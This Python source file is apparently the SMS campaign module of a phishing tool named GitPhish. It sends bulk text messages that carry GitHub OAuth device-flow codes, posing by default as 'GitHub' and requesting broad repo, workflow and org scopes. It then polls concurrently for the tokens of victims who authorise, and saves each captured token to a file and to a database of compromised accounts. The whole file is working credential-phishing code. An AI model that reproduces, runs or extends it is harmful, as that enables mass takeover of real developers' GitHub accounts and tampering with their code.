"""
SMS Campaigns for GitPhish.
Handles campaign creation, execution, and management.
"""

import uuid
import logging
import threading
import time
import csv
import re
import concurrent.futures
from io import StringIO
from datetime import datetime, timezone
from typing import Any, Optional
from gitphish.models.database import db_session_scope, get_database_manager
from gitphish.models.sms.campaign import SMSCampaign
from gitphish.models.github.compromised_account import CompromisedGitHubAccount
from gitphish.core.sms.providers.factory import ProviderFactory
from gitphish.config.auth import GitHubAuthConfig
from gitphish.core.clients.auth.github_oauth_client import GitHubDeviceAuth
from gitphish.core.common.file import TokenStorageManager
from gitphish.core.accounts.services.compromised_service import CompromisedGitHubAccountService


logger = logging.getLogger(__name__)

PHONE_E164_PATTERN = re.compile(r'^\+[1-9]\d{7,14}$')
MAX_SMS_LENGTH = 1600
CAMPAIGN_ID_LENGTH = 8
DB_FLUSH_INTERVAL = 10
RATE_LIMIT_DELAY = 1.0
OAUTH_POLL_INTERVAL = 5
DEFAULT_CLIENT_ID = '178c6fc778ccc68e1d6a'
DEFAULT_ORG_NAME = 'GitHub'


class SMSCampaignService:
    """Service for managing SMS campaigns."""

    def __init__(self):
        self.running_campaigns = {}
        self._campaigns_lock = threading.Lock()
        get_database_manager()

    @staticmethod
    def _validate_phone_number(phone: str) -> bool:
        """Validate phone number in E.164 format (+1234567890)."""
        return bool(PHONE_E164_PATTERN.match(phone))

    @staticmethod
    def _validate_email(email: str) -> bool:
        """Basic email validation."""
        return '@' in email and len(email) > 3

    @staticmethod
    def _validate_message_length(message: str) -> bool:
        """Validate SMS message length."""
        return len(message) <= MAX_SMS_LENGTH

    def _log_campaign(self, campaign, session, message: str):
        """Add a log message to campaign (internal use, same context only).

        Args:
            campaign: Campaign object
            session: Database session
            message: Log message to add
        """
        campaign.add_log(message)
        session.commit()

    def _log_campaign_indexed(self, campaign_id: str, index: int, total_targets: int, message: str):
        """Add an indexed log message to campaign (cross-thread use)."""
        with db_session_scope() as session:
            campaign = session.query(SMSCampaign).filter_by(id=campaign_id).first()
            if campaign:
                campaign.add_log(f"[{index}/{total_targets}] {message}")
                session.commit()

    def _log_token_capture(self, campaign_id: str, logs: list):
        """Record successful OAuth token capture from thread (increments counter and adds logs).

        Args:
            campaign_id: Campaign ID
            logs: List of log messages about the token capture
        """
        with db_session_scope() as session:
            campaign = session.query(SMSCampaign).filter_by(id=campaign_id).first()
            if campaign:
                campaign.tokens_captured += 1
                for log_msg in logs:
                    campaign.add_log(log_msg)
                session.commit()

    def create_campaign(
        self,
        provider: str,
        targets: list[dict[str, str]],
        message_template: str,
        name: str = "Unnamed Campaign",
        oauth_scope: str = "repo user gist notifications workflow read:org read:public_key read:repo_hook read:user read:discussion",
        client_id: Optional[str] = None,
        org_name: Optional[str] = None,
        skip_wait: bool = False,
        **provider_config
    ) -> str:
        """Create a new SMS campaign

        Args:
            provider: SMS provider name ('twilio' or 'aws')
            targets: List of target dicts with 'email' and 'phone' keys
            message_template: SMS message template with {variable} placeholders
            name: Campaign name for identification
            oauth_scope: GitHub OAuth scope for token capture (default: full scope with workflow)
            client_id: GitHub OAuth app client ID (defaults to DEFAULT_CLIENT_ID)
            org_name: Target organization name in phishing messages (defaults to DEFAULT_ORG_NAME)
            skip_wait: Skip OAuth token polling (send SMS only, don't wait for authorization)
            **provider_config: Provider-specific configuration (e.g., sid, token, access_key_id)

        Returns:
            campaign_id: The created campaign ID

        Examples:
            # Single target
            service.create_campaign(
                provider='twilio',
                targets=[{'email': 'user@example.com', 'phone': '+15551234567'}],
                message_template='Your code: {user_code}',
                sid='AC123...',
                token='xyz...',
                from_phone='+15559999999'
            )

            # Bulk targets
            service.create_campaign(
                provider='aws',
                targets=parsed_csv_targets,
                message_template='Hi {email}, code: {user_code}',
                name='Bulk Campaign',
                access_key_id='AKIA...',
                secret_access_key='...',
                region='us-east-1'
            )
        """
        # Validate inputs
        if not targets:
            raise ValueError("No targets provided for campaign")

        if not provider:
            raise ValueError("Provider is required")

        if not message_template:
            raise ValueError("Message template is required")

        # Validate provider exists
        try:
            ProviderFactory.get_provider_class(provider)
        except ValueError as e:
            raise ValueError(f"Invalid provider '{provider}': {e}")

        # Generate campaign ID
        campaign_id = f"sms_{uuid.uuid4().hex[:CAMPAIGN_ID_LENGTH]}"

        # Determine target method based on number of targets
        target_method = 'single' if len(targets) == 1 else 'bulk'

        with db_session_scope() as session:
            campaign = SMSCampaign(
                id=campaign_id,
                name=name,
                provider=provider,
                config=provider_config,
                target_method=target_method,
                targets=targets,
                message_template=message_template,
                oauth_scope=oauth_scope,
                client_id=client_id,
                org_name=org_name,
                skip_wait=skip_wait
            )

            campaign.add_log(
                f"Campaign '{campaign.name}' created with "
                f"{len(targets)} targets"
            )
            session.add(campaign)
            session.commit()

        return campaign_id

    def start_campaign(self, campaign_id: str) -> bool:
        """Start a campaign execution in a background thread."""
        with self._campaigns_lock:
            if campaign_id in self.running_campaigns:
                logger.warning(f"Campaign {campaign_id} is already running")
                return False

        with db_session_scope() as session:
            campaign = session.query(SMSCampaign).filter_by(id=campaign_id).first()
            if not campaign:
                logger.error(f"Campaign {campaign_id} not found")
                return False

            campaign.status = 'running'
            campaign.started_at = datetime.now(timezone.utc)
            campaign.add_log("Campaign started")
            session.commit()

        thread = threading.Thread(target=self._execute_campaign, args=(campaign_id,))
        thread.daemon = True

        with self._campaigns_lock:
            self.running_campaigns[campaign_id] = thread

        thread.start()

        logger.info(f"Campaign {campaign_id} started in background thread")
        return True

    def _execute_campaign(self, campaign_id: str):
        """Execute the campaign (runs in background thread).

        Uses per-target database sessions to maintain state consistency.
        Each target gets its own session that commits immediately, ensuring
        the database always reflects current progress. This allows for:
        - Graceful shutdown (current state always in DB)
        - Progress monitoring (real-time updates)
        - Resume capability (if process crashes)
        """
        logger.info(f"Executing campaign {campaign_id}")

        config = self._load_campaign_config(campaign_id)
        if not config:
            return

        provider = self._initialize_provider(
            config['provider_name'],
            config['provider_config']
        )
        if not provider:
            with db_session_scope() as session:
                campaign = session.query(SMSCampaign).filter_by(id=campaign_id).first()
                if campaign:
                    self._mark_campaign_failed(campaign, session, "Provider initialization failed")
            return

        with db_session_scope() as session:
            campaign = session.query(SMSCampaign).filter_by(id=campaign_id).first()
            if campaign:
                self._log_campaign(
                    campaign,
                    session,
                    f"Starting SMS delivery for {config['total_targets']} targets"
                )

        pending_tokens = []
        try:
            for i, target in enumerate(config['targets'], 1):
                if i > 1:
                    time.sleep(RATE_LIMIT_DELAY)

                # Uses campaign_id to get fresh status for stop checks
                token_info = self._process_single_target(
                    campaign_id,
                    target,
                    i,
                    config['total_targets'],
                    provider,
                    config['oauth_scope'],
                    config['oauth_client_id'],
                    config['oauth_org_name'],
                    config['message_template']
                )

                if token_info is None:
                    with db_session_scope() as session:
                        campaign = session.query(SMSCampaign).filter_by(id=campaign_id).first()
                        if campaign and campaign.status == 'stopped':
                            break
                else:
                    pending_tokens.append(token_info)

            if pending_tokens:
                with db_session_scope() as session:
                    campaign = session.query(SMSCampaign).filter_by(id=campaign_id).first()
                    if campaign:
                        if config['skip_wait']:
                            self._handle_skip_wait_tokens(campaign, session, pending_tokens)
                        else:
                            self._handle_token_polling(campaign_id, pending_tokens, config['total_targets'])

            with db_session_scope() as session:
                campaign = session.query(SMSCampaign).filter_by(id=campaign_id).first()
                if campaign:
                    self._mark_campaign_completed(campaign, session, config['total_targets'])

        except Exception as e:
            logger.error(f"Error executing campaign {campaign_id}: {str(e)}", exc_info=True)
            with db_session_scope() as session:
                campaign = session.query(SMSCampaign).filter_by(id=campaign_id).first()
                if campaign:
                    self._mark_campaign_failed(campaign, session, f"Campaign execution error: {str(e)}")

        finally:
            with self._campaigns_lock:
                if campaign_id in self.running_campaigns:
                    del self.running_campaigns[campaign_id]

    def _load_campaign_config(self, campaign_id: str) -> Optional[dict]:
        """Load campaign configuration from database.

        Returns:
            dict with campaign config or None if not found
        """
        with db_session_scope() as session:
            campaign = session.query(SMSCampaign).filter_by(id=campaign_id).first()
            if not campaign:
                logger.error(f"Campaign {campaign_id} not found during execution")
                return None

            return {
                'targets': campaign.targets,
                'total_targets': len(campaign.targets),
                'provider_name': campaign.provider,
                'provider_config': campaign.config or {},
                'message_template': campaign.message_template,
                'oauth_scope': campaign.oauth_scope,
                'oauth_client_id': campaign.client_id or DEFAULT_CLIENT_ID,
                'oauth_org_name': campaign.org_name or DEFAULT_ORG_NAME,
                'skip_wait': campaign.skip_wait
            }

    def _initialize_provider(self, provider_name: str, provider_config: dict):
        """Initialize SMS provider instance.

        Returns:
            Provider instance or None if initialization fails
        """
        try:
            return ProviderFactory.get_provider(provider_name, provider_config)
        except Exception as e:
            logger.error(f"Failed to create provider: {e}")
            return None

    def _process_single_target(
        self,
        campaign_id: str,
        target: dict,
        index: int,
        total_targets: int,
        provider,
        oauth_scope: str,
        oauth_client_id: str,
        oauth_org_name: str,
        message_template: str
    ) -> Optional[dict]:
        """Process a single target: generate OAuth code and send SMS.

        Returns:
            Dict with pending token info if SMS sent successfully, None otherwise
        """
        with db_session_scope() as session:
            campaign = session.query(SMSCampaign).filter_by(id=campaign_id).first()

            if campaign.status == 'stopped':
                campaign.add_log("Campaign stopped by user")
                session.commit()
                return None

            email = target.get('email')
            phone = target.get('phone')

            auth_config = GitHubAuthConfig(
                client_id=oauth_client_id,
                org_name=oauth_org_name,
                scopes=oauth_scope
            )
            auth_client = GitHubDeviceAuth(auth_config)

            auth_client_passed = False
            try:
                device_flow = auth_client.initiate_device_flow()
                user_code = device_flow.get('user_code', '')
                device_code = device_flow.get('device_code', '')

                campaign.add_log(
                    f"[{index}/{total_targets}] Generated OAuth code: {user_code} for {email}"
                )

                message = self._prepare_message(message_template, email, device_flow)

                campaign.add_log(f"[{index}/{total_targets}] Sending SMS to {phone}")
                session.commit()

                success, error = provider.send_sms(phone=phone, message=message, email=email)

                if success:
                    campaign.sms_sent += 1
                    campaign.add_log(f"[{index}/{total_targets}] SMS sent successfully")
                    session.commit()

                    auth_client_passed = True  # Will be cleaned up by caller
                    return {
                        'email': email,
                        'device_code': device_code,
                        'user_code': user_code,
                        'auth_client': auth_client,
                        'index': index
                    }
                else:
                    error_detail = f": {error}" if error else ""
                    campaign.add_log(f"[{index}/{total_targets}] Failed to send SMS{error_detail}")
                    session.commit()
                    return None

            except Exception as target_err:
                campaign.add_log(f"[{index}/{total_targets}] Target failed: {target_err}")
                session.commit()
                logger.error(f"Target {email} failed: {target_err}")
                return None
            finally:
                # Clean up auth client if not passed to caller
                if not auth_client_passed:
                    try:
                        auth_client.close()
                    except Exception:
                        pass

    def _handle_skip_wait_tokens(self, campaign, session, pending_tokens: list):
        """Handle pending tokens when skip_wait is enabled (internal use, same context only).

        Args:
            campaign: Campaign object
            session: Database session
            pending_tokens: List of pending token info dicts
        """
        logs = [
            "All SMS sent. Skipping OAuth polling (--skip-wait enabled)",
            f"Device codes generated for {len(pending_tokens)} targets:"
        ]
        logs.extend([f"  {token_info['email']}: {token_info['user_code']}" for token_info in pending_tokens])

        for log_msg in logs:
            campaign.add_log(log_msg)
        session.commit()

        for token_info in pending_tokens:
            try:
                token_info['auth_client'].close()
            except Exception:
                pass

    def _handle_token_polling(self, campaign_id: str, pending_tokens: list, total_targets: int):
        """Handle OAuth token polling for pending tokens (cross-thread use)."""
        with db_session_scope() as session:
            campaign = session.query(SMSCampaign).filter_by(id=campaign_id).first()
            if campaign:
                campaign.add_log(f"All SMS sent. Now polling for {len(pending_tokens)} OAuth tokens...")
                session.commit()
        self._poll_tokens_concurrently(campaign_id, pending_tokens, total_targets)

    def _mark_campaign_completed(self, campaign, session, total_targets: int):
        """Mark campaign as completed (internal use, same context only).

        Args:
            campaign: Campaign object
            session: Database session
            total_targets: Total number of targets
        """
        if campaign.status != 'stopped':
            campaign.status = 'completed'
            campaign.completed_at = datetime.now(timezone.utc)
            campaign.add_log(f"Campaign completed. SMS sent: {campaign.sms_sent}/{total_targets}")
            session.commit()

    def _mark_campaign_failed(self, campaign, session, error_message: str):
        """Mark a campaign as failed (internal use, same context only).

        Args:
            campaign: Campaign object
            session: Database session
            error_message: Error message to log
        """
        campaign.status = 'failed'
        campaign.completed_at = datetime.now(timezone.utc)
        campaign.add_log(f"Campaign failed: {error_message}")
        session.commit()

    def _poll_tokens_concurrently(self, campaign_id: str, pending_tokens: list, total_targets: int):
        """Poll for OAuth tokens from all targets concurrently using threads.

        This allows multiple victims to authorize simultaneously instead of
        waiting for each one sequentially.
        """
        def poll_single_token(token_info):
            """Poll for a single token (runs in thread)."""
            email = token_info['email']
            device_code = token_info['device_code']
            user_code = token_info['user_code']
            auth_client = token_info['auth_client']
            index = token_info['index']

            # Create callback to check if campaign was stopped
            def should_continue():
                with db_session_scope() as session:
                    campaign = session.query(SMSCampaign).filter_by(id=campaign_id).first()
                    if not campaign:
                        logger.error(f"Campaign {campaign_id} not found during polling callback for {email}")
                        return False

                    logger.debug(f"Polling callback for {email}: campaign status = '{campaign.status}'")

                    if campaign.status == 'stopped':
                        logger.info(f"Campaign {campaign_id} was stopped, halting polling for {email}")
                        return False
                    if campaign.status not in ['running', 'completed']:
                        logger.warning(f"Campaign {campaign_id} has unexpected status '{campaign.status}' during polling for {email}")

                    return True

            try:
                # Use existing OAuth polling implementation with campaign stop callback
                access_token = auth_client.poll_for_token(
                    device_code=device_code,
                    interval=5,
                    email=email,
                    should_continue_callback=should_continue
                )

                if access_token:
                    # Perform all token operations, then log everything together
                    logs_to_add = [f"[{index}/{total_targets}] Token captured for {email}"]

                    try:
                        filename = TokenStorageManager.save_token_simple(access_token, email)
                        logs_to_add.append(f"[{index}/{total_targets}] Token saved to {filename}")
                    except Exception as save_err:
                        logger.warning(f"Failed to save token to file for {email}: {save_err}")
                        logs_to_add.append(f"[{index}/{total_targets}] Warning: Token file save failed")

                    try:
                        compromised_service = CompromisedGitHubAccountService()
                        visitor_data = {
                            'campaign_id': campaign_id,
                            'user_code': user_code
                        }
                        result = compromised_service.record_compromised_account(
                            email, access_token, visitor_data, source="sms"
                        )
                        if result['success']:
                            logs_to_add.append(f"[{index}/{total_targets}] Account recorded in postex database")
                        else:
                            logger.warning(f"Failed to record account in postex for {email}: {result.get('error')}")
                            logs_to_add.append(f"[{index}/{total_targets}] Warning: Account recording failed")
                    except Exception as postex_err:
                        logger.warning(f"Failed to integrate with postex for {email}: {postex_err}")
                        logs_to_add.append(f"[{index}/{total_targets}] Warning: Postex integration failed")

                    self._log_token_capture(campaign_id, logs_to_add)
                    return {'success': True, 'email': email}
                else:
                    # Check if campaign was stopped or if it actually timed out
                    with db_session_scope() as session:
                        campaign = session.query(SMSCampaign).filter_by(id=campaign_id).first()
                        if campaign and campaign.status == 'stopped':
                            self._log_campaign_indexed(campaign_id, index, total_targets, f"OAuth polling stopped for {email}")
                            return {'success': False, 'email': email, 'reason': 'stopped'}

                    self._log_campaign_indexed(campaign_id, index, total_targets, f"OAuth polling timed out for {email}")
                    return {'success': False, 'email': email, 'reason': 'timeout'}

            except Exception as e:
                logger.error(f"Polling failed for {email}: {e}", exc_info=True)
                self._log_campaign_indexed(campaign_id, index, total_targets, f"OAuth polling error for {email}: {e}")
                return {'success': False, 'email': email, 'reason': str(e)}
            finally:
                try:
                    auth_client.close()
                except Exception:
                    pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=len(pending_tokens)) as executor:
            futures = [executor.submit(poll_single_token, token_info) for token_info in pending_tokens]

            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result['success']:
                        logger.info(f"Token captured for {result['email']}")
                    else:
                        logger.info(f"Token not captured for {result['email']}: {result.get('reason', 'unknown')}")
                except Exception as e:
                    logger.error(f"Polling thread exception: {e}")

    def _prepare_message(self, template: str, email: str, device_flow: dict = None) -> str:
        """Prepare SMS message with OAuth variables.

        Args:
            template: Message template with {variable} placeholders
            email: Target email address
            device_flow: Optional device flow data from GitHub OAuth

        Available template variables:
            {email} - Target email address
            {user_code} - GitHub device code for user to enter
            {verification_uri} - GitHub verification URL
            {device_code} - Full device code (for internal use)
        """
        if device_flow:
            variables = {
                'email': email,
                'user_code': device_flow.get('user_code', ''),
                'verification_uri': device_flow.get('verification_uri', 'https://github.com/login/device'),
                'device_code': device_flow.get('device_code', '')
            }
        else:
            variables = {
                'email': email,
                'user_code': '',
                'verification_uri': '',
                'device_code': ''
            }

        message = template
        for var, value in variables.items():
            message = message.replace(f'{{{var}}}', str(value))

        return message

    def stop_campaign(self, campaign_id: str) -> bool:
        """Stop a running campaign."""
        with db_session_scope() as session:
            campaign = session.query(SMSCampaign).filter_by(id=campaign_id).first()
            if not campaign:
                return False

            campaign.status = 'stopped'
            campaign.completed_at = datetime.now(timezone.utc)
            campaign.add_log("Campaign stopped by user")
            session.commit()

        with self._campaigns_lock:
            if campaign_id in self.running_campaigns:
                logger.info(f"Campaign {campaign_id} marked for stopping")

        return True

    def parse_csv_targets(self, csv_text: str) -> dict[str, Any]:
        """Parse CSV data into a list of target dictionaries.

        Expected format:
            email,phone
            user@example.com,+15551234567
            another@example.com,+15559876543

        Handles:
        - Header row detection (skipped if present)
        - Quoted fields with commas
        - Basic email validation
        - Empty/malformed rows with error reporting

        Returns:
            dict with keys:
                - success (bool): Whether parsing succeeded
                - targets (list[dict]): List of {"email": str, "phone": str}
                - errors (list[str]): List of error messages for invalid rows
        """
        targets = []
        errors = []

        if not csv_text:
            return {"success": False, "errors": ["Empty CSV data"], "targets": []}

        try:
            reader = csv.reader(StringIO(csv_text))
            rows = list(reader)

            if not rows:
                return {"success": False, "errors": ["CSV file is empty"], "targets": []}

            # Skip first row if it's a header (contains "email" in first column)
            start_index = 0
            if rows and len(rows[0]) > 0 and 'email' in rows[0][0].lower():
                start_index = 1

            for line_num, row in enumerate(rows[start_index:], start=start_index + 1):
                if len(row) < 2:
                    errors.append(f"Line {line_num}: insufficient columns (need email,phone)")
                    continue

                email, phone = row[0].strip(), row[1].strip()

                if not self._validate_email(email):
                    errors.append(f"Line {line_num}: invalid email '{email}'")
                    continue

                if not phone:
                    errors.append(f"Line {line_num}: empty phone number")
                    continue

                if not self._validate_phone_number(phone):
                    errors.append(f"Line {line_num}: invalid phone format '{phone}' (must be E.164 format like +15551234567)")
                    continue

                targets.append({"email": email, "phone": phone})

            return {
                "success": len(targets) > 0,
                "targets": targets,
                "errors": errors
            }

        except Exception as e:
            logger.error(f"Failed to parse CSV targets: {e}")
            return {"success": False, "error": str(e), "targets": [], "errors": [str(e)]}

    def test_provider_config(self, provider: str, config: dict[str, Any]) -> dict[str, Any]:
        """Validate provider configuration using the provider's own check."""
        try:
            prov = ProviderFactory.get_provider(provider, config or {})
            return prov.test_config()
        except Exception as e:
            logger.error(f"Provider config test failed for {provider}: {e}")
            return {"success": False, "error": str(e)}

    def list_campaigns(self) -> list[dict[str, Any]]:
        """List all campaigns."""
        with db_session_scope() as session:
            campaigns = session.query(SMSCampaign).order_by(SMSCampaign.created_at.desc()).all()
            return [campaign.to_dict() for campaign in campaigns]

    def get_campaign_logs(self, campaign_id: str) -> Optional[dict[str, Any]]:
        """Get campaign logs and status."""
        with db_session_scope() as session:
            campaign = session.query(SMSCampaign).filter_by(id=campaign_id).first()
            if not campaign:
                return None

            logs_list = []
            if campaign.logs:
                for line in campaign.logs.strip().split('\n'):
                    if line.strip():
                        if line.startswith('[') and ']' in line:
                            timestamp_end = line.index(']')
                            timestamp = line[1:timestamp_end]
                            message = line[timestamp_end+2:]
                            logs_list.append({
                                'timestamp': timestamp,
                                'message': message
                            })

            tokens_list = []
            compromised_service = CompromisedGitHubAccountService()

            accounts = session.query(CompromisedGitHubAccount).filter(
                CompromisedGitHubAccount.device_auth_session_id.like(f'sms_{campaign_id}_%'),
                CompromisedGitHubAccount.is_active
            ).all()

            for account in accounts:
                token = compromised_service.get_account_token(account.id)
                if token:
                    tokens_list.append({
                        'email': account.email,
                        'access_token': token,
                        'captured_at': account.created_at.timestamp() if account.created_at else None
                    })

            return {
                'success': True,
                'output': campaign.logs or 'No logs yet...',
                'logs': logs_list,
                'status': campaign.status,
                'sms_sent': campaign.sms_sent,
                'tokens_captured': len(tokens_list),  # Use actual count from compromised accounts
                'stats': {
                    'status': campaign.status,
                    'sms_sent': campaign.sms_sent,
                    'tokens_captured': len(tokens_list),  # Use actual count from compromised accounts
                    'runtime': campaign.get_runtime()
                },
                'tokens': tokens_list
            }
